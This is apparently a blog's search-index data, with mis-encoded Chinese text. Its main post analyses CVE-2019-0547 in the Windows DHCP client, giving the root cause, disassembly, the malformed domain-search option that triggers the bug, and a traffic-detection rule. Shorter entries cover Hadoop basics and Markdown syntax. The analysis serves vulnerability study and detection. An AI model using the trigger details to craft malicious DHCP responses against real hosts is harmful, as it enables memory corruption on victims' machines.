æ€»ç»“ä¸Šé¢çš„è¿‡ç¨‹ï¼ŒDHCPçš„å·¥ä½œæ–¹å¼å¦‚ä¸‹ï¼šåœ¨å®¢æˆ·ç«¯è·å–IPåœ°å€ä¹‹å‰ï¼Œå®ƒä¼šåœ¨æœ¬åœ°ç½‘ç»œä¸Šå¹¿æ’­DHCP DISCOVERæ¶ˆæ¯ã€‚ æœ¬åœ°ç½‘ç»œä¸Šçš„ä»»ä½•DHCPæœåŠ¡å™¨éƒ½å¯ä»¥ä½¿ç”¨DHCP OFFERå“åº”ï¼Œå…¶ä¸­åŒ…å«åˆ†é…ç»™å®¢æˆ·ç«¯çš„IPåœ°å€ã€‚ è¯¥IPåœ°å€é€šå¸¸æ˜¯ç§Ÿç”¨çš„ï¼Œè¿™æ„å‘³ç€å®ƒä¼šåœ¨ä¸€å®šæ—¶é—´åè¿‡æœŸã€‚ä¸ºäº†ç»­è®¢ç§Ÿçº¦ï¼Œå®¢æˆ·ç«¯å‘DHCPæœåŠ¡å™¨å‘é€å•æ’­DHCP REQUESTæ¶ˆæ¯ã€‚ DHCPæœåŠ¡å™¨ä»¥DHCP ACKæ¶ˆæ¯å“åº”ã€‚ æ‰€æœ‰DHCP messageå‡ä»¥é€šç”¨çš„æŠ¥å¤´ç»“æ„å¼€å¤´ã€‚æ‰€æœ‰å¤šå­—èŠ‚å€¼å‡ä»¥ç½‘ç»œå­—èŠ‚é¡ºåºæ’åˆ—ã€‚ è¯¥ç»“æ„æè¿°å¦‚ä¸‹[1]ï¼š offset size value 0x0000 1 Operation code (1 - request, 2 - response) 0x0001 1 Hardware type (1 - Ethernet) 0x0002 1 Hardware address length (usually 6 for Ethernet) 0x0003 1 Hops 0x0004 4 Transaction ID 0x0008 2 Time since client started 0x000A 2 Flags 0x000C 4 Client IP address if assigned 0x0010 4 Client IP address 0x0014 4 Next server IP address 0x0018 4 Relay IP address 0x001C 16 Client hardware address 0x002C 64 Server hostname (optional) 0x006C 128 Boot file name 0x00EC 4 Magic cookie (0x63 0x82 0x53 0x63) 0x00F0 variable Options é€šç”¨æ ‡å¤´çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åé¢å¯ä»¥è·Ÿå¯å˜é•¿åº¦çš„DHCPé€‰é¡¹ã€‚ æ¯ä¸ªå•ç‹¬çš„DHCPé€‰é¡¹å…·æœ‰ä»¥ä¸‹æ ¼å¼ï¼š Offset Size Value 0000 1 Option tag 0001 1 Option length (len) 0002 len Option data é™¤äº†IPåœ°å€ï¼ˆåŒ…å«åœ¨â€œå®¢æˆ·ç«¯IPåœ°å€â€å­—æ®µä¸­ï¼‰ä¹‹å¤–ï¼ŒDHCP messageè¿˜ä½¿ç”¨â€œoptionâ€æ¥åŒ…æ‹¬å…¶ä»–å‡ ä¸ªé…ç½®å‚æ•°ï¼Œä¾‹å¦‚â€œå­ç½‘æ©ç â€ï¼ˆoption tagï¼š1ï¼‰ï¼Œâ€œè·¯ç”±å™¨â€ï¼ˆoption tagï¼š3ï¼‰ï¼ŒDNSæœåŠ¡å™¨ï¼ˆoption tagï¼š6ï¼‰ï¼ŒNTPæœåŠ¡å™¨ï¼ˆoption tagï¼š4ï¼‰ï¼ŒåŸŸæœç´¢ï¼ˆoption tagï¼š119ï¼‰ã€‚ æœ‰å…³æ ‡å‡†option tagçš„åˆ—è¡¨ï¼Œè¯·å‚è§[3]ã€‚ è¯¥æ¼æ´ä¸»è¦ä¸â€œåŸŸæœç´¢â€é€‰é¡¹æœ‰å…³ï¼Œè¯¥é€‰é¡¹åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªDNSåç¼€ï¼Œå¦‚æœDNSåç§°ä¸èƒ½è‡ªè¡Œè§£æï¼Œåˆ™å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨è¯¥åç¼€é™„åŠ åˆ°DNSåç§°ã€‚ ä¾‹å¦‚ï¼Œè€ƒè™‘å°†åˆ†å‘â€œexample.comâ€çš„DHCPæœåŠ¡å™¨ä½œä¸ºåŸŸæœç´¢DNSåç¼€ã€‚ å¦‚æœå®¢æˆ·ç«¯å‘DNSæŸ¥è¯¢â€œfooâ€ï¼Œä½†æ²¡æœ‰æ”¶åˆ°ä»»ä½•DNSè®°å½•ï¼Œåˆ™å®ƒå°†ç»§ç»­æŸ¥è¯¢â€œfoo.example.comâ€ã€‚ä½¿ç”¨æ­¤åŠŸèƒ½å¯é¿å…å¯¹ç½‘ç»œå†…çš„æ‰€æœ‰ä¸»æœºé‡å¤ä½¿ç”¨é€šç”¨ç»„ç»‡DNSåç¼€ã€‚ åŸŸæœç´¢é€‰é¡¹çš„é€‰é¡¹æ•°æ®å­—æ®µåŒ…å«wire formatçš„DNSåç§°åˆ—è¡¨ã€‚DNSåç§°å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªDNSæ ‡ç­¾è¿›è¡Œç¼–ç ï¼Œå¹¶ä»¥ç»ˆæ­¢äºé›¶çš„å­—ç¬¦ç»“å°¾ã€‚DNSæ ‡ç­¾å¯ä»¥å‹ç¼©æˆ–ä¸å‹ç¼©ã€‚æœªå‹ç¼©çš„DNSæ ‡ç­¾æ˜¯ä¸€å­—èŠ‚é•¿åº¦çš„å‰ç¼€çš„å…«ä½å­—èŠ‚å­—ç¬¦ä¸²ã€‚å‹ç¼©æ ‡ç­¾æ˜¯ä¸€ä¸ªä¸¤å­—èŠ‚çš„æ— ç¬¦å·æ•´æ•°å€¼ï¼Œå…¶å‰ä¸¤ä¸ªæœ€é«˜æœ‰æ•ˆä½è®¾ç½®ä¸º1ï¼Œå…¶ä½™ä½ä»¥å­—èŠ‚ä¸ºå•ä½å­˜å‚¨åç§»é‡ã€‚å› æ­¤ï¼Œå•ä¸ªDNSåç§°å¯èƒ½ç”±å‹ç¼©å’Œæœªå‹ç¼©æ ‡ç­¾æ··åˆç»„æˆã€‚DNSæ ¹ç›®å½•â€œ.â€ç”±å•å­—èŠ‚â€œ\\x00â€è¡¨ç¤ºã€‚ä½¿ç”¨æœªå‹ç¼©çš„åç§°ç¼–ç DNSåç§°â€œexample.example.comâ€å°†å˜æˆâ€œ \\x07example\\x07example\\x03com\\x00â€ã€‚å¯ä»¥ä½¿ç”¨å‹ç¼©æ ‡ç­¾å°†å…¶ç¼–ç å¦‚ä¸‹ï¼šâ€œ\\x07example\\xc0\\x00\\x03com\\x00â€ã€‚æœ‰å…³DNSåç§°çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§[2]ã€‚ åŸç†åˆ†æ åœ¨Windowsçš„DHCPå®¢æˆ·ç«¯ä¸­å­˜åœ¨è¶Šç•Œå†™æ¼æ´ã€‚DHCPå®¢æˆ·ç«¯åœ¨å¯åŠ¨æ—¶ä½œä¸ºsvchost.exeæœåŠ¡è¿è¡Œï¼Œå¹¶éµå¾ªDHCPåè®®æ¥è·å–ç³»ç»Ÿä¸Šç½‘ç»œæ¥å£çš„IPåœ°å€ã€‚å½“æ”¶åˆ°DHCPç­”å¤æ—¶ï¼Œå®ƒå°†ä½¿ç”¨dhcpcoreè§£æDHCPé€‰é¡¹ï¼ DhcpExtractFullOptions()ï¼Œå½“é‡åˆ°åŸŸæœç´¢é€‰é¡¹ï¼ˆoption tagï¼š119ï¼‰æ—¶ï¼Œè¯¥è°ƒç”¨å†è°ƒç”¨dhcpcoreï¼DecodeDomainSearchListData()ã€‚æ­¤å‡½æ•°ä¸»è¦å°†wire formatçš„DNSåç§°è½¬æ¢ä¸ºåŸºäºæ–‡æœ¬çš„DNSåç§°ã€‚å®ƒéå†æ¯ä¸ªDNSåç§°ï¼Œåœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œè§£å‹ç¼©é‡åˆ°çš„ä»»ä½•æ ‡ç­¾ï¼Œå¹¶ä½¿ç”¨memcpy()å¤åˆ¶æ ‡ç­¾ï¼Œå¹¶åœ¨æ ‡ç­¾ä¹‹é—´æ’å…¥â€œ.â€ï¼Œåç§°ä¹‹é—´æ’å…¥\",\"ã€‚ç”¨äºå­˜å‚¨DNSåç§°çš„å·²åˆ†é…ç¼“å†²åŒºå¤§å°æ˜¯åŸºäºé•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç”±äºDNSåç§°ä»¥ç©ºå€¼ç»“å°¾ï¼Œå› æ­¤ç¼“å†²åŒºå¤§å°æ¯”DNSåç§°å°1ã€‚å› æ­¤ï¼ŒDNSåç§°â€œ\\x07example\\x03com\\x00â€å¯¼è‡´ç¼“å†²åŒºå¤§å°ä¸º12ï¼ˆè¯·æ³¨æ„ï¼Œå­—ç¬¦ä¸²çš„é•¿åº¦ä¸º13ï¼‰ã€‚å¦‚æœDHCPå›å¤æ¶ˆæ¯åŒ…å«å‰ä¸¤ä¸ªå­—èŠ‚ä¸ºé›¶çš„åŸŸæœç´¢é€‰é¡¹ï¼Œåˆ™è°ƒç”¨ç¨‹åºå‡½æ•°å°†å®ƒä»¬è§†ä¸ºä¸¤ä¸ªä¸åŒåç§°çš„ä¸¤ä¸ªä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦ï¼Œå¹¶å°†å¤§å°ä¸º0ä¼ é€’ç»™dhcpcoreï¼DecodeDomainSearchListData()ï¼Œè¯¥å‡½æ•°å°†æ— æ³•æ­£ç¡®éªŒè¯ï¼Œè€Œæ˜¯è°ƒç”¨HeapAllocåˆ†é…0å­—èŠ‚çš„ç¼“å†²åŒºã€‚ç„¶åï¼Œå®ƒç»§ç»­å¤„ç†ä¸¤ä¸ªæ ¹æ ‡ç­¾ï¼Œå¹¶å†™å…¥æ— æ•ˆç¼“å†²åŒºï¼Œä»è€Œå¯¼è‡´è¶Šç•Œå†™å…¥ã€‚ æ”»å‡»è€…å¯ä»¥è®¾ç½®ä¸€ä¸ªæ¶æ„çš„DHCPæœåŠ¡å™¨å¹¶ä½¿ç”¨æ¶æ„çš„DHCPå“åº”æ¶ˆæ¯æ¥å“åº”åŒä¸€ç½‘æ®µä¸­çš„DHCPè¯·æ±‚ï¼Œä»è€Œåˆ©ç”¨è¯¥æ¼æ´ã€‚ ä»£ç åˆ†æ åˆ†æä½¿ç”¨çš„dhcpcore.dllç‰ˆæœ¬ä¸º10.0.17134.191ã€‚ ; dhcpcore!DecodeDomainSearchListData: 6ffcb0cc 8bff mov edi,edi 6ffcb0ce 55 push ebp 6ffcb0cf 8bec mov ebp,esp 6ffcb0d1 83ec2c sub esp,2Ch 6ffcb0d4 8bc2 mov eax,edx 6ffcb0d6 894de4 mov dword ptr [ebp-1Ch],ecx 6ffcb0d9 8bc8 mov ecx,eax 6ffcb0db 8945f0 mov dword ptr [ebp-10h],eax 6ffcb0de 53 push ebx 6ffcb0df 8b5d0c mov ebx,dword ptr [ebp+0Ch] 6ffcb0e2 33d2 xor edx,edx 6ffcb0e4 c1e902 shr ecx,2 6ffcb0e7 83c164 add ecx,64h 6ffcb0ea 56 push esi 6ffcb0eb 33f6 xor esi,esi 6ffcb0ed 894dd4 mov dword ptr [ebp-2Ch],ecx 6ffcb0f0 8b4df0 mov ecx,dword ptr [ebp-10h] 6ffcb0f3 83f802 cmp eax,2 6ffcb0f6 57 push edi 6ffcb0f7 8b7d14 mov edi,dword ptr [ebp+14h] 6ffcb0fa 1bc0 sbb eax,eax 6ffcb0fc 40 inc eax 6ffcb0fd 8907 mov dword ptr [edi],eax ; å¤–å±‚å¾ªç¯å¼€å§‹ 6ffcb0ff 833f00 cmp dword ptr [edi],0 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx ; edxæ˜¯è®¡æ•°å™¨ 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx ; ç¬¬ä¸€æ¬¡è¿­ä»£æ—¶è·³è¿‡HeapFree 6ffcb10c 83fa02 cmp edx,2 6ffcb0fd 8907 mov dword ptr [edi],eax 6ffcb0ff 833f00 cmp dword ptr [edi],0 ; ç¬¬äºŒæ¬¡è¿­ä»£, HeapFree and HeapAllocéƒ½å‘ç”Ÿäº†. 6ffcb102 0f8498010000 je dhcpcore!DecodeDomainSearchListData+0x1d4 6ffcb108 42 inc edx 6ffcb109 8955f4 mov dword ptr [ebp-0Ch],edx 6ffcb10c 83fa02 cmp edx,2 6ffcb10f 7533 jne dhcpcore!DecodeDomainSearchListData+0x78 6f","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:4","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ£€æµ‹æ€è·¯ é¦–å…ˆè¦ç›‘å¬UDPçš„67/68ç«¯å£çš„æµé‡ã€‚æ£€æµ‹è®¾å¤‡å¯ä»¥æ ¹æ®DHCP Magic Cookieå€¼\\x63\\x82\\x53\\x63æ¥åˆ¤æ–­æ˜¯å¦ä¸ºDHCPæ¶ˆæ¯ã€‚ å¦‚æœæ“ä½œç ä¸º2ï¼Œåˆ™æ£€æµ‹è®¾å¤‡å¿…é¡»è§£ææ¯ä¸ªDHCPé€‰é¡¹ï¼Œå¹¶æ£€æŸ¥option tagè®¾ç½®ä¸º0x77çš„æ‰€æœ‰é€‰é¡¹çš„é€‰é¡¹æ•°æ®ã€‚å¦‚æœå‘ç°ä»»ä½•æ­¤ç±»é€‰é¡¹çš„é€‰é¡¹æ•°æ®ä»¥â€œ\\x00\\x00â€å¼€å¤´ï¼Œåˆ™åº”å°†æµé‡è§†ä¸ºå¯ç–‘çš„æ”»å‡»æµé‡ã€‚ ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:5","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ€»ç»“ è¿™ä¸ªåˆ†ææ€è·¯å¾ˆæ¸…æ¥šï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªæ¼æ´å“åº”çš„å¾®ç¼©è¿‡ç¨‹ï¼Œåˆ°æœ€åç»™å‡ºè§£å†³æ–¹æ¡ˆï¼Œä¸ªäººæ„Ÿè§‰æ¯”è¾ƒæˆç†Ÿã€‚æœ€åçš„æµé‡æ£€æµ‹ç°åœ¨å¾ˆå¤šçš„é˜²ç«å¢™éƒ½å¯ä»¥å®ç°ï¼Œä»æµé‡ä¾§æ‹¦æˆªæ”»å‡»å¥½è¿‡ä¸»æœºé˜²å¾¡ã€‚ å‚è€ƒæ–‡çŒ® [1] RFC 2131, Dynamic Host Configuration Protocol https://tools.ietf.org/html/rfc2131 [2] P. Mockapetris, RFC 1035: DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION, https://tools.ietf.org/html/rfc1035 [3] IANA, Dynamic Host Configuration Protocol (DHCP)and Bootstrap Protocol (BOOTP) Parameters, https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:1:0","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-14","objectID":"/2019/10/hadoop1/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(ä¸€)â€“ç›¸å…³æ¦‚å¿µ æœ¬ç³»åˆ—å°†ä»Hadoopå­¦ä¹ åˆ°å…¶æ¼æ´å¤ç°åˆ†æè¿›è¡Œå®Œæ•´è®°å½•ã€‚ ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"ä¸€ã€å¤§æ•°æ® ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"1. æ¦‚å¿µ Big Dataï¼šä¸»è¦æ˜¯æŒ‡æ— æ³•åœ¨ä¸€å®šèŒƒå›´å†…ç”¨å¸¸è§„æ¶¦å¥å·¥å…·è¿›è¡Œæ•æ‰ã€ç®¡ç†å’Œå¤„ç†çš„æ•°æ®é›†åˆï¼Œéœ€è¦æ–°å¤„ç†æ¨¡å¼æ‰èƒ½å…·æœ‰æ›´å¼ºçš„å†³ç­–åŠ›ã€æ´å¯Ÿå‘ç°åŠ›å’Œæµç¨‹åŒ–èƒ½åŠ›çš„æµ·é‡ã€é«˜å¢é•¿ç‡å’Œå¤šæ ·åŒ–çš„ä¿¡æ¯èµ„äº§ã€‚ä¸€è¨€æ¦‚æ‹¬ï¼šæ•°æ®å¤šåˆ°ä¼ ç»Ÿæ–¹æ¡ˆæ— æ³•å¤„ç†ã€‚ æ•°æ®çš„ä½“é‡å¹¶ä¸æ˜¯æœ€é‡è¦ï¼Œé‡è¦çš„æ˜¯éšè—åœ¨æ•°æ®ä¸­çš„ä¿¡æ¯çš„ä»·å€¼ã€‚(æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„å¤§æ•°æ®æ€ç†Ÿ) ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"2. å•ä½ ä»å°åˆ°å¤§ä¾æ¬¡ä¸ºï¼š `bit` `Byte` `KB` `MB` `GB` `TB` `PB` `EB` `ZB` `YB` `BB` `NB` å’Œ `DB` ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"3. ç‰¹ç‚¹ å¤§é‡ï¼šä½“é‡å¤§ é«˜é€Ÿï¼šå¤„ç†æ•°æ®çš„é€Ÿåº¦å¿…é¡»è¦å¿« å¤šæ ·ï¼šä¸åŒåœºæ™¯ä¼šäº§ç”Ÿä¸åŒçš„æ•°æ®æº ä½ä»·å€¼å¯†åº¦ï¼šå³ä½¿æ•°æ®é‡å¾ˆå¤§ï¼Œæˆ‘ä»¬å§‹ç»ˆå…³æ³¨çš„åº”è¯¥åªæ˜¯ç‰¹å®šçš„ä¸€éƒ¨åˆ†ï¼Œè€Œå¹¶ä¸æ˜¯æ•´ä½“ ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:1:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"äºŒã€Hadoop ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"1. æ¦‚å¿µ Hadoopæ˜¯ä¸€ä¸ªç”±ApacheåŸºé‡‘ä¼šæ‰€å¼€å‘çš„åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€æ¶æ„ï¼Œä¸»è¦ç”¨æ¥è§£å†³å¤§æ•°æ®çš„å­˜å‚¨å’Œåˆ†æè®¡ç®—é—®é¢˜ã€‚ç°åœ¨å·²å‘å±•æˆä¸ºä¸€ä¸ªå®Œæ•´çš„ç”Ÿæ€æŠ€æœ¯ï¼Œè€Œä¸æ˜¯å•çº¯çš„Hadoopäº§å“ã€‚ ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:1","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"2. ç‰ˆæœ¬ Apacheç‰ˆæœ¬ï¼šæœ€åŸå§‹(æœ€åŸºç¡€)çš„ç‰ˆæœ¬ï¼Œå¯¹äºå…¥é—¨å­¦ä¹ æœ€å¥½ï¼Œæ¯•ç«Ÿæ˜¯å‡ºç”Ÿåœ°ï¼Œè¡€ç»Ÿä¹Ÿæ˜¯æœ€æ­£çš„ã€‚(æœ¬ç³»åˆ—æ–‡ç« ä¸»è¦ä¸“æ³¨äºè¯¥ç‰ˆæœ¬) Cloudera ï¼šåœ¨å¤§å‹äº’è”ç½‘ä¼ä¸šä¸­ç”¨çš„è¾ƒå¤šã€‚ Hortonworksï¼šæ–‡æ¡£æ¯”è¾ƒå…¨ã€‚ ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"3. ä¼˜åŠ¿ é«˜å¯é æ€§ï¼šåº•å±‚ä½¿ç”¨å¤šä¸ªæ•°æ®å‰¯æœ¬(åˆ†å¸ƒå¼å­˜å‚¨çš„ç”ŸåŠ¨ä½“ç°) é«˜æ‰©å±•æ€§ï¼šåœ¨é›†ç¾¤é—´åˆ†é…ä»»åŠ¡æ•°æ®ï¼Œå¯ä»¥æ–¹ä¾¿çš„æ‰©å±•æ•°ä»¥åƒè®¡çš„èŠ‚ç‚¹ã€‚ é«˜æ•ˆæ€§ï¼šåœ¨MapReduceæ€æƒ³ä¸‹ï¼ŒHadoopè¢«è®¾è®¡ä¸ºå¹¶è¡Œå·¥ä½œ é«˜å®¹é”™æ€§ï¼šèƒ½å°†å¤±è´¥çš„ä»»åŠ¡é‡æ–°åˆ†é… ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Vuln"],"content":"4. ç»„æˆéƒ¨åˆ† Hadoop 2.0ä¹‹åï¼Œä¸»è¦ç”±ä»¥ä¸‹å››ä¸ªéƒ¨åˆ†ç»„æˆï¼š Commonï¼šå…¶ä»–Hadoopæ¨¡å—æ‰€éœ€çš„Javaåº“å’Œå®ç”¨ç¨‹åºã€‚è¿™äº›åº“æä¾›æ–‡ä»¶ç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿçº§æŠ½è±¡ï¼Œå¹¶åŒ…å«å¯åŠ¨Hadoopæ‰€éœ€çš„Javaæ–‡ä»¶å’Œè„šæœ¬ Map-Reduceï¼šè®¡ç®— Yarnï¼š èµ„æºè°ƒåº¦ HDFSï¼š æ•°æ®å­˜å‚¨ 1. Map - Reduceç¼–ç¨‹æ¨¡å‹ å®šä¹‰ï¼šåˆ†å¸ƒå¼è¿ç®—ç¨‹åºçš„ç¼–ç¨‹æ¡†æ¶ï¼Œæ ¸å¿ƒæ¡†æ¶ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å°†ç”¨æˆ·ç¼–å†™çš„ä¸šåŠ¡é€»è¾‘ä»£ç å’Œè‡ªå¸¦é»˜è®¤ç»„ä»¶æ•´åˆæˆå®Œæ•´çš„åˆ†å¸ƒå¼è¿ç®—ç¨‹åºï¼Œå¹¶å‘è¿è¡Œåœ¨ä¸€ä¸ªHadoopé›†ç¾¤ä¸Šã€‚ é˜¶æ®µï¼šmapé˜¶æ®µå’Œreduceé˜¶æ®µï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯å°†ä»»åŠ¡è¿›è¡Œå¹¶è¡Œè®¡ç®—ï¼Œåˆ†è€Œæ²»ä¹‹ï¼Œç„¶åå°†ç»“æœæ±‡æ€» 2. Yarn è¯ç”ŸäºHadoop 2.xé˜¶æ®µï¼Œä¸»è¦è´Ÿè´£èµ„æºè°ƒåº¦(2.xä¹‹å‰ï¼Œèµ„æºè°ƒåº¦ç”±map-reduceè´Ÿè´£) æ¶æ„ç»„æˆï¼š ResourceManger(RM)ï¼šå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ã€ç›‘æ§NodeMangerã€å¯åŠ¨æˆ–ç›‘æ§ApplicationMasterã€èµ„æºåˆ†é…äºè°ƒåº¦ NodeManager(NM)ï¼šç®¡ç†å¸¦ä¸ªèŠ‚ç‚¹ä¸Šçš„èµ„æºã€å¤„ç†æ¥è‡ªRMçš„å‘½ä»¤ã€å¤„ç†æ¥è‡ªAMçš„å‘½ä»¤ ApplicationMaster(AM)ï¼šè´Ÿè´£æ•°æ®çš„åˆ‡åˆ†ã€ä¸ºåº”ç”¨ç¨‹åºç”³è¯·èµ„æºå¹¶åˆ†é…ç»™å†…éƒ¨çš„ä»»åŠ¡ã€ä»»åŠ¡çš„ç›‘æ§ä¸å®¹é”™ Containerï¼šYarnä¸­çš„èµ„æºæŠ½å¸é‚£ä¸ªï¼Œå°è£…äº†æŸä¸ªèŠ‚ç‚¹ä¸Šçš„å¤šç»´åº¦èµ„æºï¼Œå¦‚CPUã€å†…å­˜ã€ç£ç›˜ã€ç½‘ç»œç­‰ 3. HDFS æ¦‚å¿µï¼šHasdoop Distributed FIle Systemï¼ŒHadoopåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼Œè´Ÿè´£æ–‡ä»¶å­˜å‚¨éƒ¨åˆ†ã€‚ æ¶æ„ç»„æˆï¼š NameNode(nn)ï¼šå­˜å‚¨æ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶åã€æ–‡ä»¶ç›®å½•ç»“æ„ã€æ–‡ä»¶å±æ€§(ç”Ÿæˆæ—¶é—´ã€å‰¯æœ¬æ•°ã€æ–‡ä»¶æƒé™)ï¼Œä»¥åŠæ¯ä¸ªæ–‡ä»¶çš„å—åˆ—è¡¨å’Œå—æ‰€åœ¨çš„DataNodeç­‰ DataNode(dn)ï¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿå­˜å‚¨æ–‡ä»¶å—æ•°æ®ï¼Œä»¥åŠå—æ•°æ®çš„æ ¡éªŒå’Œã€‚ Secondary NameNode(2nn)ï¼šç›‘æ§HDFSçŠ¶æ€çš„è¾…åŠ©åå°ç¨‹åºï¼Œæ¯éš”ä¸€æ®µæ—¶é—´è·å–HDFSå…ƒæ•°æ®çš„å¿«ç…§ã€‚ å¯¹ä»¥ä¸Šæ¶æ„ä¸¾ä¾‹è¿›è¡Œè§£é‡Šï¼šåœ¨å›¾ä¹¦é¦†ä¸­ï¼ŒNameNodeå­˜å‚¨çš„æ˜¯å›¾ä¹¦é¦†æ‰€æœ‰ä¹¦ç±çš„ç›®å½•ã€ä½œè€…ã€ä¹¦çš„ä½ç½®ç­‰ä¿¡æ¯ï¼ŒDataNodeæ˜¯å­˜æ”¾ä¹¦ç±çš„ä¹¦æ¶ï¼ŒSecondary NameNodeä¸»è¦æ˜¯å­˜å‚¨æ¯æœ¬ä¹¦çš„å‰¯æœ¬ï¼Œé˜²æ­¢ä¸€æœ¬ä¹¦æŸåï¼Œæ²¡æœ‰å…¶ä»–çš„å‰¯æœ¬å¯ç”¨ã€‚ ","date":"2019-10-14","objectID":"/2019/10/hadoop1/:2:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸€)--ç›¸å…³æ¦‚å¿µ","uri":"/2019/10/hadoop1/"},{"categories":["Misc"],"content":"Markdown åŸºæœ¬è¯­æ³•","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"Markdown åŸºæœ¬è¯­æ³• è¿™ç¯‡æ–‡ç« æä¾›äº†å¯ä»¥åœ¨ Hugo çš„æ–‡ç« ä¸­ä½¿ç”¨çš„åŸºæœ¬ Markdown è¯­æ³•ç¤ºä¾‹. æ³¨æ„ è¿™ç¯‡æ–‡ç« å€Ÿé‰´äº†ä¸€ç¯‡å¾ˆæ£’çš„æ¥è‡ª Grav çš„æ–‡ç« . å¦‚æœä½ æƒ³äº†è§£ Loveit ä¸»é¢˜çš„æ‰©å±• Markdown è¯­æ³•, è¯·é˜…è¯»æ‰©å±• Markdown è¯­æ³•é¡µé¢. äº‹å®ä¸Š, ç¼–å†™ Web å†…å®¹å¾ˆéº»çƒ¦. WYSIWYGæ‰€è§å³æ‰€å¾— ç¼–è¾‘å™¨å¸®åŠ©å‡è½»äº†è¿™ä¸€ä»»åŠ¡. ä½†é€šå¸¸ä¼šå¯¼è‡´ä»£ç å¤ªç³Ÿ, æˆ–æ›´ç³Ÿç³•çš„æ˜¯, ç½‘é¡µä¹Ÿä¼šå¾ˆä¸‘. æ²¡æœ‰é€šå¸¸ä¼´éšçš„æ‰€æœ‰å¤æ‚å’Œä¸‘é™‹çš„é—®é¢˜, Markdown æ˜¯ä¸€ç§æ›´å¥½çš„ç”Ÿæˆ HTML å†…å®¹çš„æ–¹å¼. ä¸€äº›ä¸»è¦å¥½å¤„æ˜¯: Markdown ç®€å•æ˜“å­¦, å‡ ä¹æ²¡æœ‰å¤šä½™çš„å­—ç¬¦, å› 